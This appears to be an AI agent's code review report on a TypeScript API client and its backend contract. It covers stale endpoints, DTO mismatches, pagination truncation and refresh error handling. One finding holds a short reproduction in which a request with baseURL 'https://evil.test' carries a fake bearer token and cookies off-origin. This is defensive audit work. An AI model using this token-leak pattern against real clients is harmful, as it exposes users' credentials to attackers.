# API Contract / Code Quality Review

## Verdict

- Result: **FAIL**
- `codeQualityStatus`: **BLOCK**
- `recommendation`: **REQUEST_CHANGES**
- Frontend revision: `420f347c50dc5a2ccdd006ceb3be77d7e339c818`
- Backend revision inspected: `5274d042eaa96d6bf0de748939d2185db214d931`
- Diff reviewed: `05b9e7d1d9127179415898d265072605e1b9605a..HEAD`, plus current full contents of all requested files and adjacent DTO, mapper, hook, UI, test, and backend contract files.
- Scope: read-only review. No production or test files were changed; this report is the required review artifact.
- ULW status/notepad: `omo ulw-loop status --json` was unavailable (`omo: command not found`). `.omo/ulw-loop/bootstrap-notepad.md` confirms no ULW-capable executable, so the fallback report location was used.

## Success criteria applied

1. API guidance identifies a usable and authoritative contract source and tells future contributors how to resolve documentation/source drift.
2. Frontend method, path, query, request body, response envelope/shape, auth, pagination, and error handling agree with the checked-out backend contract.
3. Shared repositories and web-domain adapters have a clear ownership boundary and do not create duplicate sources of truth.
4. Tests exercise observable wire behavior without merely restating implementation constants or giving false contract confidence.
5. Type/lint/test evidence is independently inspected and does not override contradictory source evidence.

## Findings by severity

### CRITICAL

None.

### HIGH

#### H1. The active conti list client calls an endpoint removed by the backend; the API guidance and unit test reinforce the stale route

- Frontend calls `GET /api/v1/contis/team/{teamId}` at `packages/api-client/src/conti-read.repository.ts:19-21`, and `src/domains/conti/api/conti.api.ts:18-23` exposes it to the active conti query.
- The repository test locks the same path at `packages/api-client/tests/repositories.test.mjs:205-217`.
- Backend documentation still advertises that path at `../Contee-backend/docs/api.md:1044-1062`, but current backend source exposes `GET /api/v1/teams/{id}/contis` at `../Contee-backend/src/main/java/com/contee/team/controller/TeamController.java:313-335`.
- Backend commit `87d4420b46bf2f3f621197bd4f234a80df3b406d` removed the deprecated `/api/v1/contis/team/{teamId}` controller on 2026-07-10. Frontend commit `4980ef54da066d10b7bf629dc3fb58743e93e431` changed the repository and its test back to that deleted route on 2026-07-18.
- `.codex/API.md:1-3` only says to check `backend/docs/api.md`; that path does not exist from the frontend repository (`test -e backend/docs/api.md` exited 1), while `../Contee-backend/docs/api.md` does. It gives no source precedence or controller/OpenAPI cross-check, so stale prose can override executable backend truth.

Impact: the conti list request will receive 404 against the checked-out backend, blocking a routed product workflow. The green unit test is false confidence because implementation and expected constant were changed together from the same stale document.

Required fix:

1. Restore the repository path to `/api/v1/teams/${teamId}/contis` and update the contract test from an independent backend source.
2. Correct the backend documentation.
3. Expand `.codex/API.md` to point to `../Contee-backend/docs/api.md`, define executable source/OpenAPI precedence when prose conflicts, and require verification of method, path, query, body, response, auth, errors, and pagination.
4. Add an automated backend/OpenAPI contract check so a unit test cannot bless a deleted route.

#### H2. A per-request `baseURL` override can exfiltrate bearer tokens and cookies

- `packages/api-client/src/safe-url.ts:23-28` trusts any root-relative `/api/...` URL without checking `config.baseURL` against the configured API origin.
- `packages/api-client/src/client.ts:124-149` then attaches `Authorization` and leaves credentials enabled for requests classified as trusted.
- Independent reproduction against the current prebuilt package:

  ```text
  client.get('/api/v1/users/me', { baseURL: 'https://evil.test' })
  => {"authorization":"Bearer fake-token","withCredentials":true,"baseURL":"https://evil.test","url":"/api/v1/users/me"}
  ```

- Existing coverage at `packages/api-client/tests/client.test.mjs:87-128` checks an untrusted absolute `url`, but not an untrusted `baseURL` paired with a relative API path.

Impact: any caller that supplies or propagates an untrusted Axios `baseURL` can send the access token and credentialed request to another origin.

Required fix: resolve the final URL for every request, including root-relative URLs with a config-level `baseURL`, compare its origin and API prefix to the configured trusted base, strip credentials otherwise, and add the demonstrated regression case.

#### H3. Favorite mutations use the wrong backend contract

- `src/app/(dashboard)/dashboard/songs/page.tsx:102-110` sends `{ isFavorite: ... }` through `updateTeamSong`.
- `src/domains/song/api/song.api.ts:31-40` maps all updates to `PATCH /api/v1/teams/{id}/songs/{teamSongId}`.
- The frontend allows `isFavorite` in `packages/domain/src/song/dto.ts:20-30`, but the backend PATCH request has no such field at `../Contee-backend/src/main/java/com/contee/team/controller/dto/request/UpdateTeamSongRequest.java:8-18`.
- The backend contract instead provides `PUT` and `DELETE /api/v1/teams/{id}/songs/{teamSongId}/favorite` at `../Contee-backend/docs/api.md:835-849` and `TeamController.java:195-218`.
- The create DTO drifts in the opposite direction: backend create supports `isFavorite` (`CreateTeamSongRequest.java:13-25`; docs `:764-789`), while `packages/domain/src/song/dto.ts:7-18` omits it and declares unsupported `songId`/`ccliNumber` fields.

Impact: the visible favorite button can be ignored or rejected by the backend, while TypeScript incorrectly certifies the payload.

Required fix: model favorite/unfavorite as explicit API operations using the documented PUT/DELETE endpoints; remove unsupported fields from the PATCH DTO; align create fields with the backend request; add operation-level tests.

#### H4. The web song library silently truncates the backend page to its first 20 rows

- Backend returns `Page<TeamSongResponse>` and defaults to size 20 (`../Contee-backend/docs/api.md:710-728`; `TeamController.java:121-141`).
- `src/domains/song/api/song.api.ts:12-18` extracts only `data.data.content` and returns `TeamSong[]`, discarding `totalElements`, `totalPages`, and all navigation metadata.
- `src/domains/song/hooks/use-songs.ts:18-23` requests no page/size and exposes only that array. `src/domains/song/components/song-library-list.tsx:55-58,93-106` reports `songs.length` as the total and has no paging path.
- The already-added shared repository preserves the page at `packages/api-client/src/song-read.repository.ts:11-25`, but the web API bypasses it.

Impact: teams with more than 20 songs cannot see or locally search/filter songs after the first page, and the UI reports a false total.

Required fix: make one shared song repository the wire-contract owner, return `PageDto<TeamSong>` to the web hook, include page/filter inputs in the query key, and implement pagination or deliberate incremental loading.

### MEDIUM

#### M1. Dashboard API code is a stale, internally inconsistent contract hidden only by the current redirect

- `src/domains/dashboard/api/dashboard.api.ts:13-15` calls `GET /api/v1/teams/{teamId}/dashboard`.
- Current backend controllers expose no dashboard route. Backend commit `a394584400254bb2237a79beacac51ed919cc7ef` removed that controller endpoint; only unused service/response classes remain.
- The frontend dashboard shape is also incompatible with the backend response class: `packages/domain/src/dashboard/dto.ts:16-28` omits backend `worshipTime` and `occurredAt`, and types songs as `SongResponseDto`; backend `DashboardResponse.java:59-82` returns a dashboard-specific song without `createdAt` and with `isFavorite`.
- `src/app/(dashboard)/dashboard/page.tsx:1-5` currently redirects to contis, so the stale query is dormant rather than safe.

Recommendation: delete/deprecate the frontend aggregate until a supported endpoint exists, or restore/document the backend route and define an exact dashboard-specific DTO before routing the page.

#### M2. Static aliases and recording fakes provide no independent response-contract proof

- Axios generic arguments in the repositories assert response shapes but do not parse external data.
- `packages/domain/src/song/dto.ts:1-5` aliases response DTOs directly to frontend models, and pass-through mappers such as `packages/domain/src/song/mapper.ts:4-6` create a nominal boundary without a real parse or transformation.
- `packages/api-client/tests/repositories.test.mjs:12-42` returns queued responses regardless of requested path. The team repository test at `:64-138` performs ten operations in one test, combining many `When`s and making failures order-coupled.
- `packages/domain/tests/mappers.test.mjs:75-89` verifies that an identity mapper returns the same object; this is implementation-mirroring coverage, not contract behavior.

Recommendation: generate types/client code from backend OpenAPI or parse external responses once at the API boundary with schemas. Keep mapper tests only where mapping behavior exists. Split repository tests per operation and source expected contracts independently from production constants.

#### M3. Refresh error semantics collapse retryable failures into logout and swallow unknown refresh defects

- `packages/api-client/src/client.ts:48-60` treats every Axios 4xx refresh response as terminal and `:198-209` catches every refresh exception, returning the original 401 instead of preserving the typed cause.
- The mobile adapter converts every 4xx to `null` at `apps/mobile/src/lib/mobile-auth-api.ts:116-143`; secure-session then clears stored tokens at `apps/mobile/src/lib/secure-session-core.ts:141-157`.
- The backend explicitly rate-limits mobile refresh and emits 429 (`../Contee-backend/src/main/java/com/contee/auth/filter/MobileAuthRateLimitFilter.java:27-40,88-106`). There is no 429 coverage in the inspected frontend auth/client tests.

Recommendation: make refresh return a discriminated result or throw typed terminal/retryable errors. Preserve sessions on 408/429/5xx/network failures, clear only on explicit invalid/revoked-token errors, and rethrow unknown programming errors after boundary handling.

### LOW

None beyond the fixes above.

## Skill-perspective checks

- `omo:programming`: **ran**. Consulted the full skill and TypeScript reference before judging maintainability/test relevance. The diff violates this perspective through unparsed external response assertions, DTO/model aliasing, broad catch-and-swallow behavior, and misleading contract tests. No new typed code was written during review.
- `omo:remove-ai-slops`: **ran** as a review pass over scoped production and tests. No deletion-only/removal-only tests or unnecessary production parsing/normalization were found. Violations found: implementation-mirroring route coverage, identity/pass-through mapper coverage, a multi-operation mega-test, and duplicate web/shared song contract ownership. These are recorded as MEDIUM except where stale contract behavior causes the HIGH failures above.
- `omo:review-work`: consulted because this was an explicit review. Its native five-agent tools were not available in this session, so goal, QA, code-quality, security, and context/history checks were executed directly. This limitation did not prevent the concrete source and behavior reproductions above.

## Verification evidence

- `npm run typecheck --workspace @contee/domain`: PASS.
- `npm run typecheck --workspace @contee/api-client`: PASS.
- `npx tsc --noEmit --incremental false`: PASS.
- Scoped ESLint over the requested TypeScript files: PASS.
- `node --test packages/api-client/tests/client.test.mjs packages/api-client/tests/repositories.test.mjs`: PASS, 10/10, against the pre-existing current `dist`; source separately passed no-emit typecheck.
- `npm test`: PASS, 28/28, with module-type warnings only.
- `git diff --check` over scoped branch files: PASS.
- Security reproduction: FAIL as documented in H2; fake bearer token and credentials remained attached to an untrusted `baseURL`.
- Backend contract cross-check: FAIL for conti path, dashboard route, favorite mutation, and frontend pagination handling.
- Frontend working tree had no tracked edits before the report; existing untracked files were preserved. Backend `docs/api.md` had pre-existing uncommitted changes and was treated as untrusted; the conti-path mismatch is present in committed history/source independently of those changes.

## Blockers

1. Replace the deleted conti list endpoint and establish a source-of-truth/contract verification workflow.
2. Prevent auth/cookie forwarding when a request-level `baseURL` changes origin.
3. Implement favorite PUT/DELETE operations and align song request DTOs.
4. Preserve and expose song pagination rather than truncating to the first page.

Approval requires all HIGH findings to be fixed and covered by tests that fail against the current broken behavior.
